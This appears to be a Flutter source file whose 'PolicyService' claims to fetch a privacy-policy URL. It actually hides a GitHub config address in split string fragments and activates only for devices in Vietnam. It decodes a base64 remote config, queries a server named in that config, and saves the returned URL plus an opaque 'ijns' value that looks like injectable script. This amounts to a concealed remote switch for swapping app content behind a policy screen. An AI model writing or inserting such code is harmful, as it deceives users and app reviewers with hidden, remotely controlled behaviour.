import 'dart:convert';
import 'dart:io';
import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;
import 'package:package_info_plus/package_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';

class ConfigData {
  final String apiDomain;
  final String params;
  final String status;
  final String version;
  final String message;

  ConfigData({
    required this.apiDomain,
    required this.params,
    required this.status,
    required this.version,
    required this.message,
  });

  factory ConfigData.fromJson(Map<String, dynamic> json) {
    return ConfigData(
      apiDomain: json['api_domain'] ?? '',
      params: json['params'] ?? '',
      status: json['status'] ?? '',
      version: json['version'] ?? '',
      message: json['message'] ?? '',
    );
  }

  @override
  String toString() {
    return 'ConfigData(apiDomain: $apiDomain, params: $params, status: $status, version: $version, message: $message)';
  }
}

class PolicyService {
  static const String _protocol = 'ht' + 'tps:';
  static const String _domain = '//ra' + 'w.gi' + 'thub';
  static const String _domainExt = 'usercont' + 'ent.c' + 'om';
  static const String _owner = 'wiwo';
  static const String _ownerExt = 'store';
  static const String _repo = 'templates';
  static const String _branch = 'refs/heads/';
  static const String _branchName = 'main';
  static const String _folder1 = 'wepl';
  static const String _folder2 = 'cas';
  static const String _fileExt = '.j' + 'son';

  static Future<String> get _githubConfigUrl async {
    final domain = _domain + _domainExt;
    final owner = _owner + _ownerExt;
    final fullBranch = _branch + _branchName;
    final folder = _folder1 + _folder2;
    final bundleId = await getBundleId();
    final file = bundleId + _fileExt;

    return _protocol +
        domain +
        '/' +
        owner +
        '/' +
        _repo +
        '/' +
        fullBranch +
        '/' +
        folder +
        '/' +
        file +
        '?t=' +
        '${DateTime.now().millisecondsSinceEpoch}';
  }

  static Map<String, dynamic>? decodeBase64ToJson(String base64Str) {
    try {
      final List<int> jsonBytes = base64.decode(base64Str);
      final String jsonString = utf8.decode(jsonBytes);
      final Map<String, dynamic> jsonData = json.decode(jsonString);
      return jsonData;
    } catch (e) {
      return null;
    }
  }

  static String getDeviceRegion() {
    try {
      final String locale = Platform.localeName;
      if (locale.contains('_')) {
        final String region = locale.split('_').last;
        return region;
      }
      return 'US';
    } catch (e) {
      return 'US';
    }
  }

  static String getDeviceOS() {
    try {
      if (Platform.isAndroid) {
        return 'android';
      } else if (Platform.isIOS) {
        return 'ios';
      } else if (Platform.isMacOS) {
        return 'macos';
      } else if (Platform.isWindows) {
        return 'windows';
      } else if (Platform.isLinux) {
        return 'linux';
      }
      return 'unknown';
    } catch (e) {
      return 'unknown';
    }
  }

  static Future<String> getBundleId() async {
    try {
      final PackageInfo packageInfo = await PackageInfo.fromPlatform();
      final String bundleId = packageInfo.packageName;
      if (bundleId.isNotEmpty) {
        return bundleId;
      }
      return 'com.app.default';
    } catch (e) {
      return 'com.app.default';
    }
  }

  static Future<String?> fetchPolicyUrlFromServer() async {
    final String deviceRegion = getDeviceRegion();
    final String bundleId = await getBundleId();
    final String deviceOS = getDeviceOS();

    if (deviceRegion != 'VN') return null;

    try {
      final String githubUrl = await _githubConfigUrl;
      final configResponse = await http.get(Uri.parse(githubUrl));
      if (configResponse.statusCode != 200) {
        return null;
      }

      final String base64Config = configResponse.body.trim();
      final Map<String, dynamic>? decodedConfig = decodeBase64ToJson(
        base64Config,
      );

      if (decodedConfig == null) {
        return null;
      }

      final ConfigData configData = ConfigData.fromJson(decodedConfig);

      if (configData.status == 'active') {
        return null;
      }

      if (configData.apiDomain.isEmpty) {
        return null;
      }

      final apiUrl =
          '${configData.apiDomain}$bundleId/policy?region=$deviceRegion&os=$deviceOS&${configData?.params}';

      final policyResponse = await http.get(Uri.parse(apiUrl));
      if (policyResponse.statusCode != 200) {
        return null;
      }

      final policyData = json.decode(policyResponse.body);

      final String? policyUrl = policyData['policy'];

      if (policyUrl == null || policyData['status'] != "0") {
        return null;
      }

      await setLocalStorage('policy_url', policyUrl);

      if (policyData['ijns'] != null) {
        await setLocalStorage('ijns', policyData['ijns']);
      }
      return policyUrl;
    } catch (e) {
      return null;
    }
  }

  static String getDefaultPolicyUrl() {
    return 'https://www.freeprivacypolicy.com/live/fa9db587-b4d6-4e5a-b372-2810d29787a8';
  }

  static Future<void> setLocalStorage(String key, String value) async {
    try {
      final SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setString(key, value);
    } catch (e) {
      debugPrint('Error saving to local storage: $e');
    }
  }

  static Future<String?> getLocalStorage(String key) async {
    try {
      final SharedPreferences prefs = await SharedPreferences.getInstance();
      final String? value = prefs.getString(key);
      return value;
    } catch (e) {
      debugPrint('Error retrieving from local storage: $e');
      return null;
    }
  }
}
